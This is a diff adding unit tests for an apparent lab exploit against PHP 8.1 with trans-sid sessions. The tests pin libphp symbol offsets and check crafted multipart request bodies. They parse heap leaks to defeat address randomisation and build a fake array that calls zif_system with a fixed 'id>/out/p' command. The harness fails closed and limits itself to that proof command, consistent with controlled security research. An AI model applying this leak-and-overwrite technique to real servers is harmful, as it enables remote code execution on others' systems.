@@ -18,10 +18,12 @@ sys.path.insert(0, str(ROOT))
 
 from elf import inspect_elf, verify_elf_against_profile  # noqa: E402
 from exploit import LabExploit, resolve_lab_target  # noqa: E402
+from php81_trans_sid import Php81TransSidExploit, _http_body  # noqa: E402
 from pure_http_oom import PureHttpOomExploit  # noqa: E402
 from profile import (  # noqa: E402
     ProfileError,
     load_profile,
+    parse_hex,
     require_verified,
     safe_proof_command,
     validate_profile,
@@ -31,6 +33,7 @@ from profile_tool import command_calibrate, command_manifest  # noqa: E402
 
 
 PROFILE_PATH = ROOT / "profiles" / "php-8.4.26-apache-amd64-fixed.json"
+PHP81_PROFILE_PATH = ROOT / "profiles" / "php-8.1.34-apache-amd64-trans-sid.json"
 PURE_PROFILE_PATH = ROOT / "profiles" / "php-8.2.34-apache-amd64-pure-http-oom.json"
 
 
@@ -41,6 +44,17 @@ class ProfileTests(unittest.TestCase):
     def test_verified_profile_loads(self) -> None:
         require_verified(self.profile)
         self.assertEqual(self.profile.strategy, "fixed-carrier-v1")
+
+    def test_session_rewrite_runtime_keys_are_optional_for_older_strategies(self) -> None:
+        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
+        data["runtime"].update({
+            "session_use_trans_sid": False,
+            "session_use_cookies": True,
+            "session_use_only_cookies": True,
+            "upload_progress_cleanup": True,
+            "url_rewriter_tags": "a=href",
+        })
+        validate_profile(data)
 
     def test_candidate_refuses_execution(self) -> None:
         data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
@@ -304,6 +318,207 @@ class PureHttpOomProfileTests(unittest.TestCase):
         self.assertEqual(body[ht + 0x98:ht + 0x98 + 9], b"id>/out/p")
         with self.assertRaisesRegex(ProfileError, "fixed uid proof"):
             PureHttpOomExploit(mock.Mock(), self.profile, b"uname -a")
+
+
+class Php81TransSidProfileTests(unittest.TestCase):
+    def setUp(self) -> None:
+        self.profile = load_profile(PHP81_PROFILE_PATH)
+
+    def test_complete_profile_is_verified_and_exact(self) -> None:
+        require_verified(self.profile)
+        self.assertEqual(self.profile.strategy, "php81-trans-sid-v1")
+        self.assertEqual(self.profile.raw["build"]["php"]["version"], "8.1.34")
+        self.assertEqual(self.profile.raw["runtime"]["memory_limit"], "128M")
+        self.assertEqual(self.profile.raw["runtime"]["post_max_size"], "192M")
+        self.assertIs(self.profile.raw["runtime"]["session_use_trans_sid"], True)
+        self.assertIs(self.profile.raw["runtime"]["session_use_cookies"], False)
+        self.assertIs(self.profile.raw["runtime"]["session_use_only_cookies"], False)
+        self.assertIs(self.profile.raw["runtime"]["upload_progress_cleanup"], True)
+        self.assertEqual(
+            self.profile.raw["runtime"]["url_rewriter_tags"],
+            "a=href,area=href,frame=src,form=",
+        )
+        self.assertEqual(self.profile.hx("symbols", "zif_system", "offset"), 0x36F470)
+        self.assertEqual(self.profile.hx("symbols", "zval_ptr_dtor", "offset"), 0x457150)
+
+    def test_runtime_and_reclaim_geometry_fail_closed(self) -> None:
+        data = json.loads(PHP81_PROFILE_PATH.read_text(encoding="utf-8"))
+        data["runtime"]["memory_limit"] = "129M"
+        with self.assertRaisesRegex(ProfileError, "exact 128M/192M/192M/1000 runtime"):
+            validate_profile(data)
+
+        data = json.loads(PHP81_PROFILE_PATH.read_text(encoding="utf-8"))
+        data["request_recipe"]["b2"]["fake_array_offset"] = "0x75800"
+        with self.assertRaisesRegex(ProfileError, "share one reclaim page"):
+            validate_profile(data)
+
+        bad_runtime_values = {
+            "session_use_trans_sid": False,
+            "session_use_cookies": True,
+            "session_use_only_cookies": True,
+            "upload_progress_cleanup": False,
+            "url_rewriter_tags": "a=href",
+        }
+        for key, value in bad_runtime_values.items():
+            with self.subTest(runtime_key=key):
+                data = json.loads(PHP81_PROFILE_PATH.read_text(encoding="utf-8"))
+                data["runtime"][key] = value
+                with self.assertRaises(ProfileError):
+                    validate_profile(data)
+
+        data = json.loads(PHP81_PROFILE_PATH.read_text(encoding="utf-8"))
+        del data["runtime"]["session_use_trans_sid"]
+        with self.assertRaisesRegex(ProfileError, "missing session_use_trans_sid"):
+            validate_profile(data)
+
+    def test_http_response_framing_fails_closed(self) -> None:
+        self.assertEqual(
+            _http_body(b"HTTP/1.1 200 OK\r\nContent-Length: 3\r\n\r\nabc"),
+            b"abc",
+        )
+        with self.assertRaisesRegex(ProfileError, "truncated or overlong"):
+            _http_body(b"HTTP/1.1 200 OK\r\nContent-Length: 4\r\n\r\nabc")
+
+        chunked = (
+            b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n"
+            b"3\r\nabc\r\n0\r\n\r\n"
+        )
+        self.assertEqual(_http_body(chunked), b"abc")
+        trailer = (
+            b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n"
+            b"3\r\nabc\r\n0\r\nX-Trace: local\r\n\r\n"
+        )
+        self.assertEqual(_http_body(trailer), b"abc")
+
+        with self.assertRaisesRegex(ProfileError, "truncated or overlong HTTP trailer"):
+            _http_body(chunked[:-2])
+        with self.assertRaisesRegex(ProfileError, "truncated or overlong HTTP trailer"):
+            _http_body(chunked + b"trailing")
+
+        rejected = (
+            (
+                "unsupported transfer coding",
+                b"HTTP/1.1 200 OK\r\n"
+                b"Transfer-Encoding: gzip, chunked\r\n\r\nabc",
+            ),
+            (
+                "malformed transfer coding",
+                b"HTTP/1.1 200 OK\r\nTransfer-Encoding: \r\n\r\nabc",
+            ),
+            (
+                "duplicate transfer coding",
+                b"HTTP/1.1 200 OK\r\n"
+                b"Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n"
+                b"3\r\nabc\r\n0\r\n\r\n",
+            ),
+            (
+                "malformed content length",
+                b"HTTP/1.1 200 OK\r\nContent-Length: nope\r\n\r\nabc",
+            ),
+        )
+        for reason, response in rejected:
+            with self.subTest(reason=reason):
+                with self.assertRaises(ProfileError):
+                    _http_body(response)
+
+    def test_a1_and_b1_match_the_validated_request_bytes(self) -> None:
+        engine = Php81TransSidExploit(mock.Mock(), self.profile, b"id>/out/p")
+        expected_query = "q0=v&q1=v&q2=v&q3=v&q4=v"
+
+        a1, boundary, query = engine.build_a1()
+        self.assertEqual(boundary, b"C" * 10)
+        self.assertEqual(query, expected_query)
+        self.assertEqual(len(a1), 972_437)
+        self.assertEqual(
+            hashlib.sha256(a1).hexdigest(),
+            "eb33ea00b03282d1a5f726f3ef7ce13522dcf2ea2112ec77c33575169d94222b",
+        )
+
+        b1, boundary, query = engine.build_b1()
+        self.assertEqual(boundary, b"C" * 10)
+        self.assertEqual(query, expected_query)
+        self.assertEqual(len(b1), 33_128_677)
+        self.assertEqual(
+            hashlib.sha256(b1).hexdigest(),
+            "bc129aff810e30a2108f94da1d0f58d4dccddb324d904bb349ecaa73256b493e",
+        )
+
+    def test_b1_parser_requires_both_profiled_fingerprints(self) -> None:
+        engine = Php81TransSidExploit(mock.Mock(), self.profile, b"id>/out/p")
+        spec = self.profile.raw["request_recipe"]["b1"]
+        leak = bytearray(parse_hex(spec["fake_len"], "b1.fake_len"))
+        leak[:8] = b"/14BBBBB"
+        main = 0x700000000000
+        libphp = main + 0x1C00000
+        dtor = libphp + 0x457150
+        struct.pack_into("<Q", leak, parse_hex(spec["main_qword_offset"], "b1.main_qword_offset"), main + 0x40)
+        for index in range(101):
+            struct.pack_into("<Q", leak, 0x10000 + index * 8, dtor)
+
+        disclosure = engine.parse_b1_leak(bytes(leak))
+        self.assertEqual(disclosure.main_chunk, main)
+        self.assertEqual(disclosure.libphp_base, libphp)
+        self.assertEqual(disclosure.zval_ptr_dtor, dtor)
+        self.assertEqual(disclosure.dtor_hits, 101)
+
+        leak[0] = ord("!")
+        with self.assertRaisesRegex(ProfileError, "hit tag"):
+            engine.parse_b1_leak(bytes(leak))
+
+        leak[0] = ord("/")
+        short = bytes(leak[: parse_hex(spec["fake_len"], "b1.fake_len") - 8])
+        with self.assertRaisesRegex(ProfileError, "disclosure length"):
+            engine.parse_b1_leak(short)
+
+        weak = bytearray(parse_hex(spec["fake_len"], "b1.fake_len"))
+        weak[:8] = b"/14BBBBB"
+        struct.pack_into(
+            "<Q",
+            weak,
+            parse_hex(spec["main_qword_offset"], "b1.main_qword_offset"),
+            main + 0x40,
+        )
+        for index in range(99):
+            struct.pack_into("<Q", weak, 0x10000 + index * 8, dtor)
+        with self.assertRaisesRegex(ProfileError, "fingerprint is not unique"):
+            engine.parse_b1_leak(bytes(weak))
+
+        ambiguous = bytearray(weak)
+        for index in range(100):
+            struct.pack_into("<Q", ambiguous, 0x20000 + index * 8, dtor + 0x1000)
+        for index in range(101):
+            struct.pack_into("<Q", ambiguous, 0x10000 + index * 8, dtor)
+        with self.assertRaisesRegex(ProfileError, "fingerprint is not unique"):
+            engine.parse_b1_leak(bytes(ambiguous))
+
+    def test_a2_stream_and_b2_are_fixed_to_profile(self) -> None:
+        engine = Php81TransSidExploit(mock.Mock(), self.profile, b"id>/out/p")
+        chunks, boundary = engine.build_a2()
+        lengths = [len(chunk) for chunk in chunks]
+        self.assertEqual(boundary, b"S" * 17)
+        self.assertEqual(sum(lengths), 167_775_191)
+        self.assertLessEqual(max(lengths), 65_536)
+
+        main = 0x700000000000
+        libphp = main + 0x1C00000
+        body, boundary = engine.build_b2(main, libphp)
+        self.assertEqual(boundary, b"B" * 10)
+        self.assertEqual(body.count(b'Content-Disposition: form-data; name="'), 402)
+        first = body.index(b'name="s000"\r\n\r\n') + len(b'name="s000"\r\n\r\n')
+        reference = 0x160 - 0x18
+        fake_array = 0x800 - 0x18
+        self.assertEqual(struct.unpack_from("<I", body, first + reference)[0], 1)
+        self.assertEqual(struct.unpack_from("<I", body, first + reference + 4)[0], 0xA)
+        self.assertEqual(
+            struct.unpack_from("<Q", body, first + fake_array + 0x30)[0],
+            libphp + 0x36F470,
+        )
+        self.assertEqual(
+            body[first + fake_array + 0x98:first + fake_array + 0x98 + 9],
+            b"id>/out/p",
+        )
+        with self.assertRaisesRegex(ProfileError, "accepts only id>/out/p"):
+            Php81TransSidExploit(mock.Mock(), self.profile, b"uname -a")
 
 
 class RecipeTests(unittest.TestCase):
